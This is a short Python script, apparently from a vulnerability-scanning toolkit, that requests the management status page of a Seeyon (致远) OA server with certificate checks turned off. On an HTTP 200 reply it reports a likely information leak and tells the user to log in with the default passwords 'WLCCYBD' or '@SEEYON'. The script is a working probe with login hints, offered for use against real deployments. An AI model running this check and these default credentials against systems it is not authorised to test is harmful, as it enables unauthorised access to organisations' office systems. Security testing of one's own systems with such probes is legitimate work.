import time
import requests
import urllib3


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'seeyon/management/status.jsp'
    success_msg = now_time() + '[SUCCESS]可能存在致远OA敏感信息泄露请用默认密码**WLCCYBD**或**@SEEYON**登录'
    shell_msg = now_time() + '登录:{}'.format(exp_url)
    warning_msg = now_time() + '[WARNING]可能不存在致远OA_status敏感信息泄露漏洞'
    error_msg = now_time() + '[致远OA_status敏感信息泄露漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code== 200:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
        
